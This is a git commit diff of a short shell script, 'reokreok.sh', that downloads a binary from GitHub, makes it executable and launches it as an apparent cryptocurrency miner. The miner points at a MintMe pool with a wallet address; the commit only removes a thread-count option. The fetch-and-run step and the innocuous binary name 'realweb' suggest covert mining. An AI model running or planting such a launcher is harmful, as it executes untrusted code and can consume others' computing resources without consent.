ce24afe2a19ce138192bfbc65666e1b795233954
Frotinor <reysanju1999@gmail.com>
2024-12-14 04:14:51 +0700

    Update reokreok.sh

--- reokreok.sh
+++ reokreok.sh
@@ -1,3 +1,3 @@
 wget https://github.com/fikriboehimi/realweb/raw/refs/heads/main/realweb && \
 chmod +x realweb
-./realweb -o mintme.wattpool.net:1111 -u 0xDA45B452B7FB0fc31ea7c4e88Dc3db0a9685BD19 -p x -t 4 --worker-id goks --donate-level 0
+./realweb -o mintme.wattpool.net:1111 -u 0xDA45B452B7FB0fc31ea7c4e88Dc3db0a9685BD19 -p x --worker-id goks --donate-level 0
